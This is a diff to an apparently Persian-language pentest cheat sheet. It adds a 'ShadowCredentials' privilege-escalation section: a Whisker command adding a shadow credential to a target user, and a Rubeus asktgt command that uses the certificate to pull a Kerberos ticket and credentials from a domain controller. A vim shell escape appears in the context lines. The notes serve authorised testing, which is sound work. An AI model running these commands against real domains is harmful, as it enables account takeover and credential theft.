@@ -405,6 +405,15 @@ Ctrl+W
 :!/bin/sh
 ```
 
+
+### افزایش دسترسی توسط روش ShadowCredentials
+
+```text
+whisker.exe add /target:user
+.\Rubeus.exe asktgt /user:user /certificate:<base64-cert> /password:"password" /domain:domain /dc:DC.domain.dev /getcredentials /show
+```
+
+
 ### افزایش دسترسی با استفاده از acl
 
 ```text
